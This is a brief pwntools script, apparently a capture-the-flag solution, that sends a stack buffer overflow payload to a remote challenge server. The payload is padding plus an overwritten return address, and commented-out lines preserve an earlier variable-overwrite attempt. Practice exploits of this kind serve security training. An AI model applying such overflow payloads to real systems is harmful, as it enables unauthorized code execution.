from pwn import *
import struct
p = remote('node4.anna.nssctf.cn',26724)
# p = process('/home/srk/Downloads/pwn')
#v2 = 0x41348000

#payload=b'a'*(0x30-0x4)+p32(v2)

#p.sendline(payload)

#print(p.recvall())
#p.interactive()
# p.sendlineafter('name:\n',b'-1')
payload = b'a'*(0x18) + p64(0x0400726)
p.sendline(payload)
p.interactive()